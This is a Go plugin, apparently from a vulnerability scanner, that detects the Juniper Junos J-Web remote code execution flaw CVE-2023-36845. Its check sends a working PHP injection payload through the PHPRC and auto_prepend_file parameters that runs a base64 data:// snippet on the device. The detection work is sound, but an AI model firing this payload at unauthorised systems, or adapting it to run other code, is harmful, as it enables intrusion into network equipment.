package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"encoding/base64"
	"fmt"
	"net/http"
	"strings"
)

func init() {
	Register("juniper_os_rce", &juniper_os_rce{})
}

type juniper_os_rce struct{}

func (p *juniper_os_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "Juniper Networks Junos OS 远程代码执行漏洞",
		VulnInfo: "Juniper Networks Junos OS在EX Series 和SRX Series上的J-Web存在一个PHP外部变量修改漏洞，允许未经身份验证的网络攻击者控制某些重要的环境变量。",
		VulnID:   "CVE-2023-36845",
		Level:    "9.8 CRITICAL",
		URL:      "https://xz.aliyun.com/t/12892",
		Version:  "",
		CWE:      "CWE-473	PHP参数外部修改",
	}
}

func (p *juniper_os_rce) Check(netloc string) bool {
	payload1 := "allow_url_include=1\nauto_prepend_file="
	rand := utils.GenRandom(10)
	str := fmt.Sprintf("<?php echo('%s');?>", rand)
	payload2 := `"data://text/plain;base64,` + base64.StdEncoding.EncodeToString([]byte(str)) + `"`

	req, err := http.NewRequest("POST", netloc+"/?PHPRC=/dev/fd/0", bytes.NewBufferString(payload1+payload2))
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, rand) {
		return true
	}

	return false
}
